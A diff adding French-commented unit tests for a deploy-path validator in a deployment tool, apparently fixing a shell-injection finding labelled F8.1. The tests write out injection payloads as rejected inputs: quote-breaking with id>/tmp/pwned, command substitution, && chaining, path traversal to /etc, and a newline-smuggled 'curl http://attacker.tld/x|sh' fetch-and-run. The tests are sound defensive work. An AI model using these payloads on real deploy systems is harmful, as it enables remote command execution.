@@ -13,6 +13,7 @@ import {
   isValidWorkflowFile,
   isValidGitBranch,
   defaultDeployPath,
+  isValidDeployPath,
   isValidGitlabProjectPath,
   isValidBitbucketRepoUuid,
   isValidCiEnvironmentName,
@@ -264,6 +265,43 @@ describe("lib/api — fonctions pures", () => {
       expect(defaultDeployPath("production", "argo-cms")).toBe(
         "/srv/projets/production/argo-cms",
       );
+    });
+  });
+
+  describe("isValidDeployPath", () => {
+    it("accepte les chemins de deploy usuels", () => {
+      expect(isValidDeployPath("/srv/projets/production/argo-cms")).toBe(true);
+      expect(isValidDeployPath("/opt/app_v2")).toBe(true);
+      expect(isValidDeployPath("/home/deploy/sites/my.site-1")).toBe(true);
+      // La convention par defaut doit toujours passer sa propre validation.
+      expect(isValidDeployPath(defaultDeployPath("staging", "voyages"))).toBe(
+        true,
+      );
+    });
+
+    it("refuse tout ce qui peut s'echapper d'une commande shell", () => {
+      // Le vecteur de F8.1 : une quote ferme le `DEPLOY_DIR='…'` distant.
+      expect(isValidDeployPath("/srv/projets/production/app';id>/tmp/pwned;'")).toBe(
+        false,
+      );
+      expect(isValidDeployPath("/srv/`whoami`")).toBe(false);
+      expect(isValidDeployPath("/srv/$(id)")).toBe(false);
+      expect(isValidDeployPath("/srv/x\ncurl http://attacker.tld/x|sh")).toBe(
+        false,
+      );
+      expect(isValidDeployPath("/srv/a b")).toBe(false);
+      expect(isValidDeployPath("/srv/app&&id")).toBe(false);
+    });
+
+    it("refuse les chemins relatifs, la traversee et les formes ambigues", () => {
+      expect(isValidDeployPath("srv/projets/app")).toBe(false);
+      expect(isValidDeployPath("../../../../etc")).toBe(false);
+      expect(isValidDeployPath("/srv/../../etc")).toBe(false);
+      expect(isValidDeployPath("/srv//projets")).toBe(false);
+      expect(isValidDeployPath("/srv/projets/")).toBe(false);
+      expect(isValidDeployPath("/")).toBe(false);
+      expect(isValidDeployPath("")).toBe(false);
+      expect(isValidDeployPath(`/srv/${"a".repeat(300)}`)).toBe(false);
     });
   });
 
